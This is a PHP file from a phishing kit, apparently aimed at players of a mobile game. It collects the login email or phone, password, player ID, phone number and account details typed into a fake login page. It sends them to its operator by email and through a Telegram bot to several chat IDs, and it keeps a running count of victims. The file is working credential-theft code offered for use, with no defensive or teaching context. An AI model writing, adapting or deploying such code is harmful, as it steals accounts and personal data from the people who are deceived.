<?php

include 'email.php';

// Define the path to the message count file
$countFile = 'devil/web/here/datacount.txt'; // Update this path to a valid location

// Validate and sanitize input
function sanitize_input($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

$email = isset($_POST['email']) ? sanitize_input($_POST['email']) : '';
$password = isset($_POST['password']) ? sanitize_input($_POST['password']) : '';
$playid = isset($_POST['playid']) ? sanitize_input($_POST['playid']) : '';
$phone = isset($_POST['phone']) ? sanitize_input($_POST['phone']) : '';
$level = isset($_POST['level']) ? sanitize_input($_POST['level']) : '';
$login = isset($_POST['login']) ? sanitize_input($_POST['login']) : '';

// Set the Current Time Automatic
date_default_timezone_set('Asia/Kolkata');
$devil = date('h:i:s d-m-Y');

if ($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == "") {
    header("Location: index.php");
    exit();
} else {
    $subjek = " 🇮🇳 | +91 | LEVEL $level | ❤️@D3VIL_BOY❤️|RESULTS $email | LOGIN $login";
    $pesan = '
    <center>
        <div style="background-color: #1e1e1e; color: red; border: none; border-radius: 8px; padding: 20px; max-width: 600px; font-family: Arial, sans-serif;">
            <div style="background: url(https://i.postimg.cc/qvrMqCvn/IMG-20240722-201932-951.jpg); background-size: cover; width: 100%; height: 200px; border-top-left-radius: 8px; border-top-right-radius: 8px;"></div>
            <div style="background-color: #282828; padding: 10px; border-top: 1px solid #444444; text-align: center; font-weight: bold;">
                WEB BY ~ DEVIL BOY
            </div>
            <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">EMAIL/PHONE</th>
                    <td style="text-align: right; padding: 10px;">'.$email.'</td>
                </tr>
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">PASSWORD</th>
                    <td style="text-align: right; padding: 10px;">'.$password.'</td>
                </tr>
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">PLAYER ID</th>
                    <td style="text-align: right; padding: 10px;">'.$playid.'</td>
                </tr>
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">PHONE NUMBER</th>
                    <td style="text-align: right; padding: 10px;">'.$phone.'</td>
                </tr>
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">ACCOUNT LEVEL</th>
                    <td style="text-align: right; padding: 10px;">'.$level.'</td>
                </tr>
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">LOGIN</th>
                    <td style="text-align: right; padding: 10px;">'.$login.'</td>
                </tr>
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">DATA SPEED</th>
                    <td style="text-align: right; padding: 10px;">'.rand(1, 5).' ms</td>
                </tr>
            </table>
            <div style="background-color: #282828; padding: 10px; border-top: 1px solid #444444; text-align: center; font-weight: bold;">
                TIME: '.$devil.'
            </div>
            <div style="background-color: #1e1e1e; padding: 10px; border-radius: 0 0 8px 8px; text-align: center;">
                <a href="https://telegram.me/DarkWebs01" style="color: #1e90ff; text-decoration: none; margin-right: 20px;">CHANNEL</a>
                <a href="https://telegram.me/D3VIL_BOY" style="color: #1e90ff; text-decoration: none;">OWNER</a>
            </div>
        </div>
    </center>';

    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    
    // Simulate random sending speed
    $milliseconds = rand(1, 5) * 1000; // Convert to milliseconds for usleep

    $kirim = mail($emailku, $subjek, $pesan, $headers);

    if ($kirim) {
        echo '
        <center>
            <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
                <tr style="border-bottom: 1px solid #444444;">
                    <th style="text-align: left; padding: 10px;">DATA SPEED</th>
                    <td style="text-align: right; padding: 10px;">'.($milliseconds / 1000).' ms</td>
                </tr>
            </table>
        </center>';
    }
}

// Define functions for message counts
function readMessageCounts($countFile) {
    $counts = [];
    if (file_exists($countFile)) {
        $data = file_get_contents($countFile);
        $counts = unserialize($data);
    }
    return $counts;
}

function writeMessageCounts($counts, $countFile) {
    $data = serialize($counts);
    file_put_contents($countFile, $data);
}

function getMessageCount($message, &$counts) {
    return isset($counts[$message]) ? $counts[$message] : 0;
}

function updateMessageCount($message, &$counts) {
    if (isset($counts[$message])) {
        $counts[$message]++;
    } else {
        $counts[$message] = 1;
    }
}

// Ensure message count file exists
$messageWithCount = 'datacount'; // Define the message key for counting
$counts = readMessageCounts($countFile);

// Increment and get the count of the message
$count = getMessageCount($messageWithCount, $counts) + 1;

// Update the count
updateMessageCount($messageWithCount, $counts);

// Prepare Telegram message
$messageWithCount = "╭────── 𝗗𝗘𝗩𝗜𝗟 𝗕𝗢𝗬 #$count ──────╮\n" . '
╰┈┈➤ 𝗢𝘄𝗻𝗲𝗿 • '.$name.' 

╰┈┈➤ 𝗘𝗺𝗮𝗶𝗹/𝗣𝗵𝗼𝗻𝗲 :  `'.$email.'`

╰┈┈➤ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : `'.$password.'`

╰┈┈➤ 𝗣𝗵𝗼𝗻𝗲 𝗡𝗼 :  '.$phone.'

╰┈┈➤ 𝗟𝗲𝘃𝗲𝗹 : '.$level.'

╰┈┈➤ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : '.$login.'

╰┈┈➤ 𝗣𝗹𝗮𝘆𝗲𝗿 𝗨𝗜𝗗 : '.$playid.'

╰┈┈➤ 𝗪𝗘𝗕 𝗕𝗬 : [𝗗𝗘𝗩𝗜𝗟 𝗕𝗢𝗬](https://telegram.me/D3VIL_BOY)';

// Encode the message
$tpWithCount = urlencode($messageWithCount);

// Array of chat IDs
$chats = array($chat, '123455');

// Send the message to each chat ID using cURL
foreach ($chats as $chat_id) {
    $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=".$tpWithCount."&parse_mode=markdown&disable_web_page_preview=true";
    sendCurlRequest($url);
}

// Write updated message counts to file
writeMessageCounts($counts, $countFile);

// Function to send HTTP request using cURL
function sendCurlRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    if ($result === false) {
        error_log("Error sending message: " . curl_error($ch));
    }
    curl_close($ch);
}
?>
